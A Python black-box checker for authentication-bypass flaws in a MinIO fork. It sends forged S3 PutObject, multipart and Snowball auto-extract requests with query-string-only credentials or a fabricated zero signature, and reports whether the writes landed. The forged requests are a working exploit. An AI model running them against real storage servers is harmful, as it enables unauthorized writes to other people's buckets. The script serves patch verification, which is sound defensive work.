#!/usr/bin/env python3
"""Black-box check for the STREAMING-UNSIGNED-PAYLOAD-TRAILER auth bypasses (speeed76/minio security fork).

  CVE-2026-41145 / GHSA-hv4r-mvr4-25vw and CVE-2026-40344 / GHSA-9c4q-hq6p-c237 (vulnerability 2): PutObject and
      PutObjectPart with credentials only in the query string and no Authorization header skip signature verification.
  CVE-2026-40344 vulnerability 1: PutObjectExtract (Snowball auto-extract) has no case for the unsigned-trailer auth
      type, so a fabricated signature is accepted.

Usage:  check-unsigned-trailer.py ENDPOINT ACCESS_KEY SECRET_KEY        (stdlib only)
Creates bucket "cvecheck" with a real SigV4 request, then sends the three forged requests (valid access key, NO valid
signature) and reports whether each object landed. Exit 0 = all refused (patched); exit 1 = at least one write landed.
Only point it at a throwaway test server.
"""
import datetime, hashlib, hmac, io, sys, tarfile, urllib.error, urllib.parse, urllib.request

EP, AK, SK = sys.argv[1].rstrip("/"), sys.argv[2], sys.argv[3]
REGION, BUCKET = "us-east-1", "cvecheck"
host = urllib.parse.urlparse(EP).netloc


def sign(method, path, body=b"", query=""):
    """Minimal AWS SigV4 (header auth) for the legitimate setup/verification calls."""
    t = datetime.datetime.now(datetime.timezone.utc)
    amzdate, day = t.strftime("%Y%m%dT%H%M%SZ"), t.strftime("%Y%m%d")
    ph = hashlib.sha256(body).hexdigest()
    hdrs = {"host": host, "x-amz-content-sha256": ph, "x-amz-date": amzdate}
    signed = ";".join(sorted(hdrs))
    canon = "\n".join([method, urllib.parse.quote(path), query,
                       "".join(f"{k}:{hdrs[k]}\n" for k in sorted(hdrs)), signed, ph])
    scope = f"{day}/{REGION}/s3/aws4_request"
    sts = "\n".join(["AWS4-HMAC-SHA256", amzdate, scope, hashlib.sha256(canon.encode()).hexdigest()])
    k = ("AWS4" + SK).encode()
    for part in (day, REGION, "s3", "aws4_request"):
        k = hmac.new(k, part.encode(), hashlib.sha256).digest()
    sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
    hdrs["Authorization"] = f"AWS4-HMAC-SHA256 Credential={AK}/{scope}, SignedHeaders={signed}, Signature={sig}"
    return hdrs


def call(method, path, body=b"", headers=None, query=""):
    url = EP + urllib.parse.quote(path) + (("?" + query) if query else "")
    req = urllib.request.Request(url, data=body if method in ("PUT", "POST") else None, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def exists(key):
    return call("HEAD", f"/{BUCKET}/{key}", headers=sign("HEAD", f"/{BUCKET}/{key}"))[0] == 200


def chunked(payload):
    # aws-chunked with trailers enabled: <hex size>\r\n<data>\r\n0\r\n, then the trailer block, here empty: \r\n\r\n
    return f"{len(payload):x}\r\n".encode() + payload + b"\r\n0\r\n\r\n\r\n"


unsigned_trailer = {"x-amz-content-sha256": "STREAMING-UNSIGNED-PAYLOAD-TRAILER", "content-encoding": "aws-chunked"}
day = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%d")
cred_q = urllib.parse.urlencode({"X-Amz-Algorithm": "AWS4-HMAC-SHA256",
                                 "X-Amz-Credential": f"{AK}/{day}/{REGION}/s3/aws4_request"})
fake_auth = (f"AWS4-HMAC-SHA256 Credential={AK}/{day}/{REGION}/s3/aws4_request, "
             f"SignedHeaders=host;x-amz-content-sha256, Signature={'0' * 64}")

st, _ = call("PUT", f"/{BUCKET}", headers=sign("PUT", f"/{BUCKET}"))
print(f"setup: create bucket -> {st}")

results = {}
# 1. PutObject, credentials only in the query string, no Authorization header
body = b"pwned-by-query-credentials"
st, out = call("PUT", f"/{BUCKET}/a-putobject.txt", chunked(body),
               dict(unsigned_trailer, **{"x-amz-decoded-content-length": str(len(body))}), cred_q)
results["PutObject, query-string credentials"] = (st, exists("a-putobject.txt"))
out_put = out
if "-v" in sys.argv: print("  body:", out[:400])

# 2. PutObjectPart (multipart), same trick: needs a real upload id first
st0, out0 = call("POST", f"/{BUCKET}/b-multipart.txt", headers=sign("POST", f"/{BUCKET}/b-multipart.txt", query="uploads="),
                 query="uploads=")
upload_id = out0.split(b"<UploadId>")[1].split(b"</UploadId>")[0].decode() if b"<UploadId>" in out0 else ""
part_q = cred_q + "&" + urllib.parse.urlencode({"partNumber": "1", "uploadId": upload_id})
st, out = call("PUT", f"/{BUCKET}/b-multipart.txt", chunked(body),
               dict(unsigned_trailer, **{"x-amz-decoded-content-length": str(len(body))}), part_q)
results["PutObjectPart, query-string credentials"] = (st, st == 200)

# 3. PutObjectExtract (Snowball), fabricated signature
tbuf = io.BytesIO()
with tarfile.open(fileobj=tbuf, mode="w") as tf:
    data = b"pwned-by-snowball"
    ti = tarfile.TarInfo("c-snowball.txt"); ti.size = len(data); tf.addfile(ti, io.BytesIO(data))
tb = tbuf.getvalue()
# the handler has no case for this auth type, so it never decodes aws-chunked: an attacker sends the raw tar
st, out = call("PUT", f"/{BUCKET}/x.tar", tb,
               dict(unsigned_trailer, **{"x-amz-decoded-content-length": str(len(tb)), "Authorization": fake_auth,
                                         "X-Amz-Meta-Snowball-Auto-Extract": "true"}))
results["PutObjectExtract (Snowball), fake signature"] = (st, exists("c-snowball.txt"))
if "-v" in sys.argv: print("  snowball body:", out[:400])

# 4. PutObjectExtract again, correctly aws-chunked: on a patched server this must fail the signature check itself
st4, out4 = call("PUT", f"/{BUCKET}/y.tar", chunked(tb),
                 dict(unsigned_trailer, **{"x-amz-decoded-content-length": str(len(tb)), "Authorization": fake_auth,
                                           "X-Amz-Meta-Snowball-Auto-Extract": "true"}))
results["PutObjectExtract (Snowball), chunked, fake signature"] = (st4, exists("c-snowball.txt") and st4 == 200)
codes = {}
for k, o in (("PutObject", out_put), ("Snowball chunked", out4)):
    codes[k] = o.split(b"<Code>")[1].split(b"</Code>")[0].decode() if b"<Code>" in o else "-"
if "-v" in sys.argv: print("  error codes:", codes)

bad = 0
for name, (status, landed) in results.items():
    verdict = "VULNERABLE (write landed)" if landed else "refused"
    bad += bool(landed)
    print(f"{name:48s} HTTP {status}  -> {verdict}")
sys.exit(1 if bad else 0)
